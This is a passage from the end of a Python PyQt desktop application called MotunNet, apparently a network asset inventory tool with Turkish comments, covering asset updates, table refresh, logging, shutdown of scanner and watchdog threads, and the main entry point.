            self.org.update_asset(device.asset_id,**dialog.get_data())
            updated=self.org.assets.get(device.asset_id)
            if updated:
                device.asset_name,device.asset_type=updated.name,updated.asset_type
                device.department_id=updated.department_id;device.department_name=self.org.departments.get(updated.department_id).name if updated.department_id in self.org.departments else ""
                device.location,device.is_critical=updated.location,updated.is_critical
                self.refresh_device_display(device);self.org_widget.refresh_all()
                self.log(f"✏️ Varlık güncellendi: {updated.name}")
    def refresh_device_display(self,device):
        if device.ip in self.radar.positions:self.radar.positions[device.ip]['device']=device
        # Mevcut filtreleri koruyarak kartları yenile
        self.filter_device_cards(self.device_search.text())
        # Tabloyu güncelle
        for row in range(self.table.rowCount()):
            if self.table.item(row,0) and self.table.item(row,0).text()==device.ip:
                self.table.item(row,1).setText(device.asset_name or "-")
                try:self.table.item(row,1).setForeground(QColor(ASSET_CONFIG[AssetType(device.asset_type)]['color']))
                except:pass
                try:self.table.item(row,2).setText(ASSET_CONFIG[AssetType(device.asset_type)]['name'])
                except:pass
                self.table.item(row,3).setText(device.department_name or "-");self.table.item(row,4).setText(device.location or "-");break
        self.update_stats()
    def log(self,msg):self.log_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
    def closeEvent(self, e):
        if self.scanner_thread and self.scanner_thread.isRunning():
            self.scanner_thread.stop()
            self.scanner_thread.wait()
        if hasattr(self, 'watchdog_widget'):
            self.watchdog_widget.stop_watchdog()
            self.watchdog_widget.audit.close()  # SQLite bağlantısını kapat
        e.accept()

def main():
    app=QApplication(sys.argv);app.setApplicationName("MotunNet");app.setWindowIcon(create_app_icon())
    window=MotunNetWindow();window.show()
    sys.exit(app.exec())

if __name__=="__main__":
    main()
